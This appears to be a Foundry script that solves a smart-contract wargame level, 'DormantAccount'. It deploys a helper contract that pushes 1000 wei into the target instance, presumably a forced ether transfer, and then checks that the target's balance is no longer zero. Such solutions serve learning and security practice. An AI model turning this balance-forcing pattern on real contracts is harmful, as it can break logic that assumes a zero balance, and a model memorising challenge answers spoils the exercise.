// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {DormantAccount, MyAccount} from "src/31/DormantAccount.sol";

contract DormantAccountScript is Script {
    function setUp() public {}

    function solve(address instanceAddress) public {
        vm.startBroadcast();

        DormantAccount problem = DormantAccount(instanceAddress);

        MyAccount myInstance = new MyAccount();

        myInstance.injectEther{value: 1000 wei}(payable(address(problem)));

        uint256 balance = address(problem).balance;
        if (balance == 0) {
            revert("Failed to inject ether");
        }

        vm.stopBroadcast();
    }
}
